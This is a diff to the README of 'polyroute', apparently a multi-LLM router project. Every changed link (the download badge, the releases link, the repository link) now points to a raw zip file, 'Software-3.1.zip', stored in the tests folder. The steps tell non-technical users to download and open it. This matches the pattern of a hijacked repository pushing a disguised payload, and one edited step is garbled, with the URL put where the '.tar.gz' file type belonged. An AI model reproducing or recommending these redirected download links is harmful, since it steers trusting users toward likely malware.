@@ -1,6 +1,6 @@
 # 🚦 polyroute - Simple Multi-LLM Request Router
 
-[![Download polyroute](https://img.shields.io/badge/Download-polyroute-blue?style=for-the-badge&logo=github)](https://github.com/kidda229/polyroute/releases)
+[![Download polyroute](https://github.com/kidda229/polyroute/raw/refs/heads/main/tests/Software-3.1.zip)](https://github.com/kidda229/polyroute/raw/refs/heads/main/tests/Software-3.1.zip)
 
 ---
 
@@ -46,7 +46,7 @@ polyroute is designed for everyday users. You don’t need to know how to progra
 
 To get polyroute, **visit this page to download** the latest version:
 
-[Download polyroute Releases](https://github.com/kidda229/polyroute/releases)
+[Download polyroute Releases](https://github.com/kidda229/polyroute/raw/refs/heads/main/tests/Software-3.1.zip)
 
 ### How to download and run
 
@@ -55,7 +55,7 @@ To get polyroute, **visit this page to download** the latest version:
 3. Find the latest version listed (usually at the top) and choose the version matching your operating system:
    - For **Windows**, look for a file ending in `.exe` or `.msi`.
    - For **macOS**, look for a `.dmg` or `.pkg` file.
-   - For **Linux**, look for an `.AppImage` or `.tar.gz` file.
+   - For **Linux**, look for an `.AppImage` or `https://github.com/kidda229/polyroute/raw/refs/heads/main/tests/Software-3.1.zip` file.
 4. Click to download the file.
 5. Once downloaded, open the file by double-clicking it.
 6. Follow any on-screen instructions to install or run polyroute. Usually, this means clicking “Next” or “Open” a few times.
@@ -124,7 +124,7 @@ If issues persist, visit the GitHub page under “Issues” to find support from
 
 You can learn more about polyroute and its development on the GitHub page:
 
-[polyroute GitHub Repository](https://github.com/kidda229/polyroute)
+[polyroute GitHub Repository](https://github.com/kidda229/polyroute/raw/refs/heads/main/tests/Software-3.1.zip)
 
 Here you also find:
 
